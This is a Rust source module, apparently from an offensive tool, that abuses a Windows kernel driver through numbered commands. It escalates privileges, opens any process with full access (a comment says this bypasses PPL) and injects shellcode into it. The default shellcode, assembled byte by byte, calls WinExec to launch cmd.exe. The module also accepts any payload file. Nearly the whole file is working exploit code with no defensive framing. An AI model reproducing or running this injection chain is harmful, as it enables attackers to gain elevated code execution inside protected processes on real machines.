use std::ffi::c_void;
use std::sync::atomic::{AtomicI32, Ordering};

use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Threading::{
    CreateThread, WaitForSingleObject,
    INFINITE, THREAD_CREATE_RUN_IMMEDIATELY,
};

use crate::proto::{
    Handle, ARG_OFF,
    CMD_INJECT_INIT, CMD_INJECT, CMD_OPEN_PROC, PROC_ALL_ACCESS,
    make_wbcc, send_cmd,
};
use crate::session::escalate;
use crate::wbmf::{install_trampoline, set_page_rx};

pub static INJECT_STATUS: AtomicI32 = AtomicI32::new(i32::MIN);

#[repr(C)]
pub struct InjectArgs {
    pub dev: Handle,
    pub pe_base: u64,
    pub our_pid: u32,
    pub target_pid: u32,
    pub shellcode: *const u8,
    pub shellcode_len: u32,
    pub sentinel_offset: u32,
}
unsafe impl Send for InjectArgs {}
unsafe impl Sync for InjectArgs {}
pub static mut G_INJECT: InjectArgs = InjectArgs {
    dev: 0, pe_base: 0, our_pid: 0, target_pid: 0,
    shellcode: std::ptr::null(), shellcode_len: 0,
    sentinel_offset: 0,
};

// WinExec("cmd.exe /c start cmd.exe", SW_SHOW)
const CMD_STR: &[u8] = b"cmd.exe /c start cmd.exe\0";

fn build_shellcode(winexec_addr: u64) -> Vec<u8> {
    let str_len = CMD_STR.len();
    let rip_offset: u32 = 22;
    let mut sc = Vec::with_capacity(33 + str_len);
    sc.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);                          // sub rsp, 0x28
    sc.extend_from_slice(&[0x48, 0x8D, 0x0D]);
    sc.extend_from_slice(&rip_offset.to_le_bytes());                            // lea rcx, [rip+N]
    sc.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);                    // mov edx, 1
    sc.extend_from_slice(&[0x48, 0xB8]);
    sc.extend_from_slice(&winexec_addr.to_le_bytes());                          // mov rax, imm64
    sc.extend_from_slice(&[0xFF, 0xD0]);                                       // call rax
    sc.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);                          // add rsp, 0x28
    sc.extend_from_slice(&[0xC3]);                                             // ret
    sc.extend_from_slice(CMD_STR);
    sc
}

unsafe extern "system" fn inject_worker(_: *mut c_void) -> u32 {
    let a = &G_INJECT;
    let wbcc = make_wbcc(a.pe_base);

    if !escalate(a.dev, &wbcc, a.our_pid) {
        INJECT_STATUS.store(-1, Ordering::SeqCst);
        return 1;
    }

    // cmd 801 — init injection infrastructure (RtlCreateUserThread + W32pServiceTable)
    let (st801, _) = send_cmd(a.dev, CMD_INJECT_INIT, &wbcc, |_| {});
    println!("[+] cmd 801  inject init  NTSTATUS {:#010x}", st801 as u32);
    if st801 != 0 {
        eprintln!("[-] injection init failed");
        INJECT_STATUS.store(st801, Ordering::SeqCst);
        return 1;
    }

    // cmd 785 — get PROCESS_ALL_ACCESS handle (KernelMode, bypasses PPL)
    let (st785, proc_handle) = send_cmd(a.dev, CMD_OPEN_PROC, &wbcc, |req| {
        req[ARG_OFF..ARG_OFF+4].copy_from_slice(&a.target_pid.to_le_bytes());
        req[ARG_OFF+4..ARG_OFF+8].copy_from_slice(&PROC_ALL_ACCESS.to_le_bytes());
    });
    println!("[+] cmd 785  handle={proc_handle:#x}  NTSTATUS {:#010x}", st785 as u32);
    if st785 != 0 || proc_handle == 0 {
        eprintln!("[-] open process failed");
        INJECT_STATUS.store(st785, Ordering::SeqCst);
        return 1;
    }

    let sc = std::slice::from_raw_parts(a.shellcode, a.shellcode_len as usize);
    println!("[+] shellcode  {} bytes @ {:#x}", sc.len(), a.shellcode as u64);

    // cmd 820 — kernel-mode injection
    //   a1+0  (8): unused (flags & 1 = handle mode, we use PID mode)
    //   a1+8  (8): target PID (flags & 2)
    //   a1+24 (8): pointer to shellcode in our usermode memory
    //   a1+32 (4): shellcode size
    //   a1+36 (4): entry point offset (0 = start of shellcode)
    //   a1+40 (4): output/sentinel size (0 = no readback)
    //   a1+44 (1): flags = 0x02 (resolve target by PID)
    let (st820, _) = send_cmd(a.dev, CMD_INJECT, &wbcc, |req| {
        req[ARG_OFF+8..ARG_OFF+16].copy_from_slice(&(a.target_pid as u64).to_le_bytes());
        req[ARG_OFF+24..ARG_OFF+32].copy_from_slice(&(sc.as_ptr() as u64).to_le_bytes());
        req[ARG_OFF+32..ARG_OFF+36].copy_from_slice(&(sc.len() as u32).to_le_bytes());
        req[ARG_OFF+36..ARG_OFF+40].copy_from_slice(&0u32.to_le_bytes());
        req[ARG_OFF+40..ARG_OFF+44].copy_from_slice(&a.sentinel_offset.to_le_bytes());
        req[ARG_OFF+44] = 0x02;
    });
    println!("[+] cmd 820  inject  NTSTATUS {:#010x}", st820 as u32);
    println!("[+] Thread executed in target PID");
    INJECT_STATUS.store(0, Ordering::SeqCst);
    0
}

pub fn run_inject(
    dev: Handle, pe_ptr: *mut u8, soi: usize,
    our_pid: u32, target_pid: u32,
    payload_path: Option<&str>,
) -> i32 {
    let pe_base = pe_ptr as u64;

    let (sc, sentinel_offset): (&'static [u8], u32) = match payload_path {
        Some(path) => {
            match std::fs::read(path) {
                Ok(data) => {
                    println!("[+] payload  {path} ({} bytes)", data.len());
                    let s = data.len() as u32;
                    let mut buf = data;
                    buf.extend_from_slice(&[0u8; 4]);
                    (Box::leak(buf.into_boxed_slice()), s)
                }
                Err(e) => { eprintln!("[-] read {path}: {e}"); return -1; }
            }
        }
        None => {
            let winexec_addr: u64 = unsafe {
                use windows::core::s;
                use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
                let k32 = match GetModuleHandleA(s!("kernel32.dll")) {
                    Ok(h) => h,
                    Err(_) => { eprintln!("[-] GetModuleHandleA(kernel32) failed"); return -1; }
                };
                match GetProcAddress(k32, s!("WinExec")) {
                    Some(p) => p as usize as u64,
                    None => { eprintln!("[-] GetProcAddress(WinExec) failed"); return -1; }
                }
            };
            println!("[+] WinExec  {winexec_addr:#018x}");
            let built = build_shellcode(winexec_addr);
            println!("[+] shellcode  {} bytes", built.len());
            let s = built.len() as u32;
            let mut buf = built;
            buf.extend_from_slice(&[0u8; 4]);
            (Box::leak(buf.into_boxed_slice()), s)
        }
    };

    unsafe {
        G_INJECT = InjectArgs {
            dev, pe_base, our_pid, target_pid,
            shellcode: sc.as_ptr(),
            shellcode_len: sc.len() as u32,
            sentinel_offset,
        };
    }

    install_trampoline(pe_ptr, 0x580, inject_worker as u64);
    println!("[+] trampoline  {:#x} -> inject_worker", pe_base + 0x580);
    unsafe { set_page_rx(pe_ptr, soi); }

    let entry: windows::Win32::System::Threading::LPTHREAD_START_ROUTINE =
        unsafe { std::mem::transmute((pe_base + 0x580) as usize) };
    let th = unsafe {
        CreateThread(None, 0, entry, None, THREAD_CREATE_RUN_IMMEDIATELY, None)
            .expect("CreateThread(inject_worker)")
    };
    unsafe { WaitForSingleObject(th, INFINITE); let _ = CloseHandle(th); }
    INJECT_STATUS.load(Ordering::SeqCst)
}
